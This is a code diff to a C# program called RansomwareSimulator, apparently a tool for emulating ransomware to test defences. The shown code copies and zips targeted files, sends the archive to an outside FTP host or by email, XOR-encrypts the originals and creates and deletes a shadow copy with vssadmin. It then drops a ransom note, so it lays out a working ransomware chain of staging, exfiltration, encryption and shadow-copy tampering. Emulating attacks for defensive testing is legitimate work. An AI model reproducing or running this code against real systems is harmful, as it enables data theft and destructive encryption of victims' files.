@@ -77,7 +77,7 @@ namespace RansomwareSimulator
         }
         static void Start(string Workingdir, List<string> Extensions, int Maxfiles)
         {
-           
+
             _ = new List<string>();
             log.Info($"[START] List Backup and Encrypt files with the following extensions {string.Join(" ;", Extensions)} On {Workingdir}. Files count {Maxfiles}");
             List<string> Files = Recon.TraverseTree(Workingdir, Extensions, Maxfiles);
@@ -90,7 +90,7 @@ namespace RansomwareSimulator
                     string fullpath = Path.GetDirectoryName(file);
                     try
                     {
-                        string backup = string.Concat(fullpath, @"\\" +name, ".backup");
+                        string backup = string.Concat(fullpath, @"\\" + name, ".backup");
                         File.Copy(file, backup, true);
                         log.Info($"A backup of {file} was made here => {backup}");
                     }
@@ -119,23 +119,43 @@ namespace RansomwareSimulator
             string path = Directory.GetCurrentDirectory() + @"\" + upathNane;
             DirectoryInfo di = Directory.CreateDirectory(path);
             Console.WriteLine($"The directory {path} was created successfully at {Directory.GetCreationTime(path)}.");
-            foreach (string file in Files)
+           
+            if (!string.IsNullOrEmpty(FTPHost) || !string.IsNullOrEmpty(SMTPServer))
             {
-                try
+                log.Info($"[+] Preparing files to be exfiltred");
+                foreach (string file in Files)
                 {
-                    //Prepare copies to exfiltrate
-                    string name = Path.GetFileName(file);
-                    string exfiltrate = string.Concat(path, @"\", name);
-                    File.Copy(file, exfiltrate, true);
-                    log.Info($"{file} successfully copied to {exfiltrate}");
+                    try
+                    {
+                        //Prepare copies to exfiltrate
+                        string name = Path.GetFileName(file);
+                        string exfiltrate = string.Concat(path, @"\", name);
+                        File.Copy(file, exfiltrate, true);
+                        log.Info($"[+] {file} successfully copied to {exfiltrate}");
+                    }
+                    catch (Exception ex)
+                    {
+                        log.Error($"[-] The exception {ex.Message} wast thrown when copying {file}");
+                        continue;
+                    }
                 }
-                catch (Exception ex)
-                {
-                    log.Error($"The exception {ex.Message} wast thrown when copying {file}");
-                    continue;
-                }
+                string sCompressedFile = PrepareFiles(upathNane, path);
+                // Exfiltrate 
+                log.Info($"[+] Starting exfiltration");
+                ExfiltrateData(upathNane, sCompressedFile);
             }
+            //Start Encryption
+            StartEncryptionProcess(Files);
+            //list Shadow copies than Create & Delete a shadow copy
+            WorkWithShadowCopies();
+            //Drop the note
+            Utils.DropRansomNote();
+        }
+
+        private static string PrepareFiles(string upathNane, string path)
+        {
             //Zip and remove folder
+            log.Info($"[+] Creating a zip file out of files to be exfiltred");
             string sCompressedFile = Directory.GetCurrentDirectory() + @"\" + upathNane + ".zip";
             try
             {
@@ -146,31 +166,27 @@ namespace RansomwareSimulator
                     Compress.CompressProcessor.ZipFolder(path, path, zip);
                     zip.Finish();
                     zip.Close();
-                    log.Info($"Archive created : {sCompressedFile}");
+                    log.Info($"[+] Archive created : {sCompressedFile}");
                 }
             }
             catch (Exception ex)
             {
-                log.Error(ex.Message);
+                log.Error($"[-] The exception {ex.Message} wast thrown when creating the archive {sCompressedFile}");
             }
             //Delete created folder
             try
             {
+                log.Info($"[+] Removing : {path}");
                 Utils.DeleteDirectory(path);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                log.Error($"Error while removing {path}");
+                log.Error($"[-] Error while removing {path}. {ex.Message}");
             }
-            // Exfiltrate 
-            ExfiltrateData(upathNane, sCompressedFile);
-            //Start Encryption
-            StartEncryptionProcess(Files);
-            //list Shadow copies than Create & Delete a shadow copy
-            WorkWithShadowCopies();
-            //Drop the note
-            Utils.DropRansomNote();
+
+            return sCompressedFile;
         }
+
         private static void ExfiltrateData(string upathNane, string sCompressedFile)
         {
             if (!string.IsNullOrEmpty(FTPHost))
@@ -180,17 +196,17 @@ namespace RansomwareSimulator
                     if (File.Exists(sCompressedFile))
                     {
                         Exfil.FTP.Exfiltrate(FTPHost, sCompressedFile, upathNane + ".zip", FTPUser, FTPPassword);
-                        log.Info($"The file {sCompressedFile} was sent to {FTPHost}");
+                        log.Info($"[+] The file {sCompressedFile} was sent to {FTPHost}");
                     }
                     else
                     {
-                        Console.WriteLine($"{upathNane + ".zip"} File not found. Nothing to Exfiltrate");
+                        Console.WriteLine($"[-] {upathNane + ".zip"} File not found. Nothing to Exfiltrate");
                     }
 
                 }
                 catch (Exception ex)
                 {
-                    log.Error($"Something went wrong: {ex.Message}");
+                    log.Error($"[-] Something went wrong: {ex.Message}");
                 }
 
             }
@@ -201,17 +217,17 @@ namespace RansomwareSimulator
                     if (File.Exists(sCompressedFile))
                     {
                         Exfil.Email.Send(SMTPServer, SMTPPort, SMTPSender, SMTPReciever, SMTPUser, SMTPPwd, sCompressedFile);
-                        log.Info($"The file {sCompressedFile} was sent to {SMTPReciever}");
+                        log.Info($"[+] The file {sCompressedFile} was sent to {SMTPReciever}");
                     }
                     else
                     {
-                        Console.WriteLine($"{upathNane + ".zip"} File not found. Nothing to Exfiltrate");
+                        Console.WriteLine($"[-] {upathNane + ".zip"} File not found. Nothing to Exfiltrate");
                     }
 
                 }
                 catch (Exception ex)
                 {
-                    log.Error($"Something went wrong: {ex.Message}");
+                    log.Error($"[-] Something went wrong: {ex.Message}");
                 }
             }
             //Try to delete exfiltrated file 
@@ -220,30 +236,30 @@ namespace RansomwareSimulator
                 try
                 {
                     File.Delete(sCompressedFile);
-                    log.Info($"Archive deleted : {sCompressedFile}");
+                    log.Info($"[+] Archive deleted : {sCompressedFile}");
                 }
                 catch (Exception ex)
                 {
-                    log.Error($"Error while deleting {sCompressedFile}. {ex.Message}");
+                    log.Error($"[-] Error while deleting {sCompressedFile}. {ex.Message}");
                 }
             }
         }
         private static void StartEncryptionProcess(List<string> Files)
         {
             List<string> encryptedFiles = new List<string>();
-            log.Info($"Starting Encryption using the Password {EncryptionPassword}");
+            log.Info($"[+] Starting Encryption using the Password {EncryptionPassword}");
             Parallel.ForEach(Files, file =>
             {
                 try
                 {
                     Crypto.XOR.XORtFile(file, string.Concat(file, ".xor"));
-                    log.Info($"Encrypting {file} as {string.Concat(file, ".xor")}");
-                    Console.WriteLine($"Encrypting {file} as {string.Concat(file, ".xor")}");
+                    log.Info($"[+] Encrypting {file} as {string.Concat(file, ".xor")}");
+                    Console.WriteLine($"[+] Encrypting {file} as {string.Concat(file, ".xor")}");
                     encryptedFiles.Add(file);
                 }
                 catch (Exception ex)
                 {
-                    log.Error($"Error when encrypting {file}. {ex.Message})");
+                    log.Error($"[-] Error when encrypting {file}. {ex.Message})");
                 }
             });
             Console.WriteLine($"\nSummary of Encryption:\n");
@@ -258,46 +274,50 @@ namespace RansomwareSimulator
         {
             if (CreateDeleteShadow)
             {
+                log.Info($"[+] Working on Shadow Copies");
+                Console.WriteLine($"[+] Working on Shadow Copies");
                 List<string> shadows = new List<string>();
                 shadows = Recon.ListShadowCopies();
                 if (shadows?.Count > 0)
                 {
-                    Console.WriteLine($"\nShadow Copies found:\n");
+                    Console.WriteLine($"\n[+] Shadow Copies found:\n");
                     Console.WriteLine($"{string.Join("\n", shadows)}");
                     log.Info($"\nShadow Copies found:\n{string.Join("\n", shadows)}");
                 }
-                Console.WriteLine($"\nCreating shadow copy...\n");
+                Console.WriteLine($"\n[+] Creating shadow copy...\n");
+                log.Info($"\nCreating shadow copy...\n");
                 string createdShadow = Utils.RunLOLb("powershell.exe", Consts.CreateShadow);
                 if (Regex.IsMatch(createdShadow, Consts.GUIDRegex))
                 {
-                    Console.WriteLine($"\nShadow copy created:: {createdShadow}\n");
-                    log.Info($"\nShadow copy created:: {createdShadow}\n");
+                    Console.WriteLine($"\n[+] Shadow copy created:: {createdShadow}\n");
+                    log.Info($"\n[+] Shadow copy created: {createdShadow}\n");
                     try
                     {
                         createdShadow = createdShadow.TrimStart().TrimEnd().Replace("\r\n", string.Empty);
                         //Delete the created shadow copy
-                        Console.WriteLine($"\nRemoving shadow copy...\n");
+                        Console.WriteLine($"\n[+] Removing shadow copy...\n");
+                        log.Info($"\n[+] Removing shadow copy...\n");
                         string deletecopy = Utils.RunLOLb("vssadmin.exe", string.Format(Consts.DeleteShadow, createdShadow));
                         Console.WriteLine(deletecopy);
                         log.Info(deletecopy);
-                        Console.WriteLine($"\nDouble checking...\n");
+                        Console.WriteLine($"\n[+] Double checking...\n");
                         deletecopy = Utils.RunLOLb("vssadmin.exe", string.Format(Consts.DeleteShadow, createdShadow));
                         if (deletecopy.Contains(Consts.NoItemFound, StringComparison.OrdinalIgnoreCase))
                         {
-                            log.Info($"{createdShadow} successfully deleted");
-                            Console.WriteLine($"{createdShadow} successfully deleted");
+                            log.Info($"[+] {createdShadow} successfully deleted");
+                            Console.WriteLine($"[+] {createdShadow} successfully deleted");
                         }
                     }
                     catch (Exception ex)
                     {
                         Console.WriteLine(ex.Message);
-                        log.Error($"\nSomething went wrong when deleting a shadow copy: {createdShadow}. {ex.Message}\n");
+                        log.Error($"\n[-] Something went wrong when deleting a shadow copy: {createdShadow}. {ex.Message}\n");
                     }
                 }
                 else
                 {
-                    Console.WriteLine($"\nSomething went wrong when creating a shadow copy: {createdShadow}\n");
-                    log.Error($"\nSomething went wrong when creating a shadow copy: {createdShadow}\n");
+                    Console.WriteLine($"\n[-] Something went wrong when creating a shadow copy: {createdShadow}\n");
+                    log.Error($"\n[-] Something went wrong when creating a shadow copy: {createdShadow}\n");
                 }
             }
         }
